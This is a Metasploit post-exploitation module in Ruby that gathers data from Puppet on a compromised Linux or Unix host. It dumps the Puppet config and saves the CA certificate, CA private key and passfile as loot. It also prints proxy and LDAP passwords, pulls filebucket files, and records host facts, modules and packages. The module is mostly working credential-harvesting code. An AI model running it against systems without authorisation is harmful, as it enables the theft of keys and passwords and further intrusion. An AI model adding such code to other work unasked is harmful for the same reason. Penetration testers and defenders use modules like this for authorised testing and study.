##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Puppet Config Gather',
        'Description' => %q{
          This module will grab Puppet config files, credentials, host information, and file buckets.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # Metasploit Module
        ],
        'Platform' => ['linux', 'unix'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/Tikam02/DevOps-Guide/blob/master/Infrastructure-provisioning/Puppet/puppet-commands.md']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new('FILEBUCKET', [false, 'Gather files from filebucket', true]),
        OptString.new('PUPPET', [false, 'Puppet executable location']),
        OptString.new('FACTER', [false, 'Facter executable location'])
      ], self.class
    )
  end

  def puppet_exe
    return @puppet if @puppet

    ['/opt/puppetlabs/puppet/bin/puppet', datastore['PUPPET']].each do |exec|
      next unless file?(exec)
      next unless executable?(exec)

      @puppet = exec
    end
    @puppet
  end

  def facter_exe
    return @facter if @facter

    ['/opt/puppetlabs/puppet/bin/facter', datastore['FACTER']].each do |exec|
      next unless file?(exec)
      next unless executable?(exec)

      @facter = exec
    end
    @facter
  end

  def filebucket
    server_list = cmd_exec("#{puppet_exe} filebucket server-list")

    print_good("Puppet Filebucket Servers: #{serverlist}") unless server_list.blank?

    file_list = cmd_exec("#{puppet_exe} filebucket -l list")
    return if file_list.include? 'File not found'

    columns = ['Hash', 'Date', 'Filename', 'Loot location']
    table = Rex::Text::Table.new('Header' => 'Puppet Filebucket Files', 'Indent' => 1, 'Columns' => columns)
    file_list.lines.each do |file|
      file = file.split(' ')
      vprint_status("Retrieving filebucket contents: #{file[3]}")
      file_content = cmd_exec("puppet filebucket -l get #{file[0]}")
      loot = store_loot('puppet.filebucket', 'text/plain', session, file_content, file[3].split('/').last, 'Puppet filebucket stored file')
      table << [file[0], "#{file[1]} #{file[2]}", file[3], loot]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def get_config
    # we prefer to run `puppet config print` over getting puppet.conf since it contains env items as well merged in
    config = cmd_exec("#{puppet_exe} config print")
    loot = store_loot('puppet.conf', 'text/plain', session, config, 'puppet.conf', 'Puppet config file')
    print_good("Stored puppet config to: #{loot}")
    config_dict = {}
    config.lines.each do |line|
      line = line.split('=')
      key = line[0].strip
      value = line[1..].join('=').strip
      config_dict[key] = value
    end

    columns = ['Parameter', 'Value', 'Loot Location']
    table = Rex::Text::Table.new('Header' => 'Puppet Configuration', 'Indent' => 1, 'Columns' => columns)

    # generic things we just want to print
    ['server', 'user'].each do |field|
      next unless config_dict.key? field

      table << [field, config_dict[field], '']
    end

    # files we want to retrieve
    ['cacert', 'cakey', 'passfile'].each do |field|
      next unless config_dict.key? field

      unless file?(config_dict[field])
        table << [field, config_dict[field], '']
        break
      end

      content = read_file(config_dict[field])
      loot = store_loot(config_dict[field], 'text/plain', session, content, config_dict[field])
      table << [field, config_dict[field], loot]
    end

    # http proxy things, skip if password wasn't set as theres nothing of value there. not set is 'none' for these fields
    if config_dict.key?('http_proxy_password') && config_dict['http_proxy_password'] != 'none'
      ['http_proxy_host', 'http_proxy_password', 'http_proxy_port', 'http_proxy_user'].each do |field|
        table << [field, config_dict[field], '']
      end
    end

    # ldap things, skip if password wasn't set as theres nothing of value there.
    if config_dict.key?('ldappassword') && !config_dict['ldappassword'].blank?
      ['ldappassword', 'ldapuser', 'ldapserver', 'ldapport', 'ldapbase', 'ldapclassattrs', 'ldapparentattr', 'ldapstackedattrs', 'ldapstring'].each do |field|
        table << [field, config_dict[field], '']
      end
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def puppet_modules
    columns = ['Module', 'Version']
    table = Rex::Text::Table.new('Header' => 'Puppet Modules', 'Indent' => 1, 'Columns' => columns)
    mods = cmd_exec("#{puppet_exe} module list")
    loot = store_loot('puppet.modules', 'text/plain', session, mods, 'Puppet modules list')
    print_good("Stored facter to: #{loot}")
    mods.lines.each do |line|
      next if line.start_with? '/' # showing paths of where things are installed to like '/etc/puppetlabs/code/modules (no modules installed)'

      mod = line.split(' ')
      mod_name = mod[1]
      mod_version = mod[2]
      mod_version = mod_version.gsub('(', '').gsub(')', '')
      table << [mod_name, mod_version]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def facter
    facter_json = cmd_exec("#{facter_exe} -j")
    facter_json = JSON.parse(facter_json)
    loot = store_loot('puppet.facter', 'text/plain', session, facter_json, 'puppet.facter', 'Puppet facter')
    print_good("Stored facter to: #{loot}")
    # There is a LOT of data here, it's probably a good idea to just fill out the system details that go in hosts
    host_info = { info: 'Running Puppet software configuration management tool' }
    host_info[:os_name] = facter_json.dig('os', 'distro', 'description') unless facter_json.dig('os', 'distro', 'description').nil?
    host_info[:os_sp] = facter_json.dig('os', 'distro', 'release', 'full') unless facter_json.dig('os', 'distro', 'release', 'full').nil?
    host_info[:arch] = facter_json.dig('os', 'arch', 'hardware') unless facter_json.dig('os', 'arch', 'hardware').nil?
    host_info[:name] = facter_json.dig('networking', 'fqdn') unless facter_json.dig('networking', 'fqdn').nil?
    host_info[:virtual_host] = facter_json['virtual'] unless facter_json['virtual'].nil? || facter_json['virtual'] == 'physical'
    facter_json.dig('networking', 'interfaces').each do |interface|
      # this is a 2 item array, interface name is item 0 (eth0), and a hash is the other info
      interface = interface[1]
      next unless interface['operational_state'] == 'up'

      host_info[:mac] = interface['mac'] unless interface['mac'].nil?
      host_info[:host] = interface['ip'] unless interface['ip'].nil?
      report_host(host_info)
    end
  end

  def puppet_packages
    packages = cmd_exec("#{puppet_exe} resource package")
    loot = store_loot('puppet.packages', 'text/plain', session, packages, 'puppet.packages', 'Puppet packages')
    print_good("Stored packages to: #{loot}")
    columns = ['Package', 'Version', 'Source']
    table = Rex::Text::Table.new('Header' => 'Puppet Packages', 'Indent' => 1, 'Columns' => columns)
    # this is in puppet DSL, and likely to change. However here's a regex with test: https://rubular.com/r/1sGTiW2mBkislO
    regex = /package\s*\{\s*'([^']+)':\s*ensure\s*=>\s*\[?'([^']+?)'\]?+,\s+.+?(?:.*?)\s*+provider\s+=>\s+'([^']+)',\n}/
    matches = packages.scan(regex)

    matches.each do |match|
      table << [match[0], match[1], match[2]]
    end
    print_good(table.to_s) unless table.rows.empty?
  end

  def run
    fail_with(Failure::NotFound, 'Puppet executable not found') if puppet_exe.nil?
    get_config
    puppet_modules
    filebucket if datastore['FILEBUCKET']
    facter
    puppet_packages
  end
end
